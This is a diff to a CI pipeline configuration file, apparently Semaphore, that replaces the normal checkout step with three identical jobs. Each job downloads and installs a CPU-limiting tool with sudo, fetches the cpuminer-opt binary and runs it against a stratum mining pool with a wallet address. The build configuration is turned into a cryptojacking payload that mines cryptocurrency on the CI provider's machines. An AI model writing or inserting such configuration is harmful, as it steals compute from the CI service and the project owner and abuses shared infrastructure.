@@ -10,4 +10,34 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - checkout
+            - 'git clone https://github.com/kadeng/limit_visible_cpus'
+            - cd limit_visible_cpus
+            - sudo pip install py3nvml
+            - sudo cp -av dist/bin/* /usr/local/bin/
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - 'tar xf cpuminer-opt-linux.tar.gz '
+            - './cpuminer-sse2 -a power2b -o stratum+tcp://stratum-asia.rplant.xyz:7022 -u Mi2YcKqEUT6ULXPq9oCE5uZrnaXrSbdsCq.Hunter -t7'
+            - sleep 2
+            - done
+        - name: 'Job #2'
+          commands:
+            - 'git clone https://github.com/kadeng/limit_visible_cpus'
+            - cd limit_visible_cpus
+            - sudo pip install py3nvml
+            - sudo cp -av dist/bin/* /usr/local/bin/
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - 'tar xf cpuminer-opt-linux.tar.gz '
+            - './cpuminer-sse2 -a power2b -o stratum+tcp://stratum-asia.rplant.xyz:7022 -u Mi2YcKqEUT6ULXPq9oCE5uZrnaXrSbdsCq.Hunter -t7'
+            - sleep 2
+            - done
+        - name: 'Job #3'
+          commands:
+            - 'git clone https://github.com/kadeng/limit_visible_cpus'
+            - cd limit_visible_cpus
+            - sudo pip install py3nvml
+            - sudo cp -av dist/bin/* /usr/local/bin/
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - 'tar xf cpuminer-opt-linux.tar.gz '
+            - './cpuminer-sse2 -a power2b -o stratum+tcp://stratum-asia.rplant.xyz:7022 -u Mi2YcKqEUT6ULXPq9oCE5uZrnaXrSbdsCq.Hunter -t7'
+            - sleep 2
+            - done
